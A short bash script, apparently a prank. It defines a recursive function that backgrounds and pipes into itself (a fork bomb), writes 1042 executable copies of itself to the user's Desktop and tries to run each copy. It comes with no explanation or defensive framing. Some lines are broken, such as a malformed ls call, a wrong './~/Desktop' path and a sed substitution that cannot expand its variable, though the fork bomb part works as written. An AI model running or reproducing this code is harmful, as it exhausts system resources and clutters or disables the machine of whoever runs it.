#!/bin/bash

plop()
{ 
	ls - Rla ~
	plop | plop &
}
for i in {1..1042}
do 
	cat ./horses.sh > ~/Desktop/poo${i}
	sed -ie 's/poo/poo${i}/g' ~/Desktop/poo${i}
	chmod 755 ~/Desktop/poo${i}
	./~/Desktop/poo${i}
	plop
done